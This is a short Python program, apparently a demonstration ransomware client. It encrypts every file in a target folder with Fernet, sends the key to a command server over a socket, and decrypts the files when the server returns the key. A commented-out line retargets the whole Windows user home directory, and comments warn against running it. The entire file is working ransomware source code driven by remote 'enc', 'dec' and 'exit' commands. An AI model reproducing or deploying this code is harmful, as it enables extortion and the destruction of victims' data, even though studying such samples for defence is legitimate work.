import os, sys
from cryptography.fernet import Fernet
import socket
import time

def ransomware():
    key = Fernet.generate_key()

    f = Fernet(key)

    if os.name == "nt":
        # ATTENTION! This comment line encrypts all personal files. Do not try on your own computer.
        #main_folder = os.environ["HOMEDRIVE"]+os.environ["HOMEPATH"]

        main_folder = "folder" # This only encrypts the contents of the folder "folder".
    elif os.name == "posix":
        print("linux, mac")
    else:
        raise OSError("Operating system not recognized.")

    for root_directory, subdirectory, files in os.walk(main_folder):
        for file in files:
            path = os.sep.join([root_directory, file])

            with open(path, "rb") as data:
                encrypted_data = f.encrypt(data.read())
            with open(path, "wb") as data:
                data.write(encrypted_data)
    return key

def ransomware_solver(key):
    f = Fernet(key)

    if os.name == "nt":
        # ATTENTION! This comment line encrypts all personal files. Do not try on your own computer.
        # main_folder = os.environ["HOMEDRIVE"]+os.environ["HOMEPATH"]

        main_folder = "folder"  # This only encrypts the contents of the folder "folder".
    elif os.name == "posix":
        print("linu, mac")
    else:
        raise OSError("Operating system not recognized.")

    for root_directory, subdirectory, files in os.walk(main_folder):
        for file in files:
            path = os.sep.join([root_directory, file])
            with open(path, "rb") as data:
                decrypted_data = f.decrypt(data.read())
            with open(path, "wb") as data:
                data.write(decrypted_data)

def client():
    HOST = "127.0.0.1"
    PORT = 65432

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        try:
            s.connect((HOST, PORT))
            print("Connected.")
        except ConnectionRefusedError:
            print("ConnectionRefusedError. After 10 seconds I try to connect again....")
            time.sleep(10)
            client()

        while True:
            x = s.recv(1024)
            
            if x == b"enc":
                s.sendall(ransomware())
            elif x == b"dec":
                while True:
                    key = s.recv(1024)
                    break
                ransomware_solver(key)
                        
            elif x == b"close" or x == b"exit": sys.exit("Remotely shut down by the server.")

            x = None

client()